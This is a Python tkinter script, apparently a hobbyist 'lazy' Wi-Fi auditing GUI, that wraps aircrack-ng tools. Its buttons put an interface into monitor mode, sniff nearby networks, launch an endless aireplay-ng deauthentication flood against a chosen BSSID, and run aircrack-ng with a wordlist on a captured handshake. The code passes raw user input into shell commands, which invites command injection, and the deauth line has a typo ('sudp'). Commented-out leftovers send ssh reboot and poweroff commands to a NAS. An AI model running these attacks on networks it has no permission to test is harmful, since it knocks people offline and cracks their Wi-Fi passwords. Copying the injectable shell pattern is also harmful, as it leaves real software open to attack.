#import subprocess
import tkinter
from tkinter import *
from tkinter import ttk
import os
import time 
import sys  
from PIL import ImageTk, Image

os.system(' figlet 802.11-Lazy')


def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()

#window = Tk()
root = Tk()

#create image 

image1 = Image.open("K.png")
test = ImageTk.PhotoImage(image1)

label1 = tkinter.Label(image=test)
label1.image = test

label1.place(x=25, y=25)
 
#modify window
root.title("802.11 auditing (GUI) ")
root.geometry("250x170")
root.configure(bg='black') 

tab_control = ttk.Notebook(root)
 
#Creating tabs
tab1 = ttk.Frame(tab_control)
tab2 = ttk.Frame(tab_control)
tab3 = ttk.Frame(tab_control)
 
#Modifying tabs
tab_control.add(tab1, text='Discover Network')
tab_control.add(tab2, text='Scan Network')

#Creating button & actions
#Tab Server
def command1():
    inter = str(input(" Interface to start ==> "))
    os.system(f' sudo airmon-ng start {inter} ')
    restart_program()
btn = Button(root, text="Start Interface", bg="black", fg="white", command=command1)
btn.grid(column=1, row=2, sticky='news')
def command2():
    inter = str(input(" Interface to stop: "))
    os.system(f' sudo airmon-ng stop {inter} ')
    restart_program()
# for tab in tab put tab1-2-3-4-5 so on    
btn = Button(text="Stop Interface", bg="black", fg="white", command=command2)
btn.grid(column=2, row=2, sticky='news')
def command3():
    inter = str(input(" Interface in MON: "))
    os.system(f' sudo airodump-ng {inter} ') 
    restart_program()
btn = Button(root, text="Scan The local area", bg="black", fg="white", command=command3)
btn.grid(column=1, row=3, sticky='news')    
def command4():
    channel = str(input(" channel to cap on: "))
    bssid = str(input(" BSSID To Monitor: "))
    inter = str(input(" Interface in MON: "))
    os.system(f' sudo airodump-ng -c {channel} --bssid {bssid} {inter} ') 
    restart_program()
btn = Button(root, text="Monitor the network", bg="black", fg="white", command=command4)
btn.grid(column=2, row=3, sticky='news')  
def atk():
    time.sleep(1)
    print(" [!] give your output in the terminal [!] ")
    A = str(input(" BSSID of target: "))
    B = str(input(" Interface to use: "))
    os.system(f' sudp aireplay-ng -0 0 -a {A} {B} ')
    time.sleep(5)
    restart_program()
btn = Button(root, text="ATTACK TARGET NETWORK", bg="red", fg="white", command=atk)
btn.grid(column=1, row=4)   
def crack():
    time.sleep(1)
    print(" [!] keep this window open [!] ")
    A = str(input(" pcapfile ==> "))
    B = str(input(" Wordlist to use ==> "))
    os.system(' clear ')
    os.system(f' sudo aircrack-ng {A} {B} ')
    time.sleep(3)
    restart_program()
btn = Button(root, text="Crack the PCAP", bg="red", fg="white", command=crack)    
btn.grid(column=2, row=4)


#############FIND LOCATION FOR DEF############
def ex():
    time.sleep(1)
    print(" [+] exiting script [+] ")
    print(" goodbye :D ")
    time.sleep(1)
    os.system(' clear ')
    sys.exit()
btn = Button(root, text="Exit Script", bg="green", fg="white", command=ex)
btn.grid(column=1, row=5)   

def install():
    time.sleep(1)
    os.system(' clear ')
    os.system(' figlet 802.11-Lazy ')
    time.sleep(1)
    os.system(' sudo apt-get install aircrack-ng ')
    restart_program()
btn = Button(root, text="install required scripts", bg="green", fg="white", command=install)
btn.grid(column=2, row=5)    

root.mainloop()

#def issue():
#    subprocess.call("ssh sweetth@192.168.1.99 sudo systemctl reboot", shell=True)
#    messagebox.showinfo('Reboot NAS', 'Reboot NAS successfully!')
#btn = Button(tab1, text="Reboot NAS", command=issue)
#btn.grid(column=1, row=10, sticky='news')
## 
#def issue():
#    subprocess.call("ssh sweetth@192.168.1.99 sudo systemctl poweroff", shell=True)
#    messagebox.showinfo('Power Off NAS', 'Power Off NAS successfully!')
#btn = Button(tab1, text="Power Off NAS", command=issue)
#btn.grid(column=2, row=10, sticky='news')
 
#Tab Computer
#def issue():
#    subprocess.call('sudo systemctl start pyload', shell=True)
#    messagebox.showinfo('Start PyLoad', 'PyLoad Started successfully!')
##btn = Button(tab2, text="Start PyLoad", command=issue)
#btn.grid(column=1, row=5, sticky='news')
# 
#def issue():
#    subprocess.call("sudo systemctl stop pyload", shell=True)
#    messagebox.showinfo('Stop PyLoad', 'Pyload Stopped successfully!')
#btn = Button(tab2, text="Stop PyLoad", command=issue)
#btn.grid(column=2, row=5, sticky='news')
# 
#tab_control.pack(expand=1, fill='both')
# 
#event loop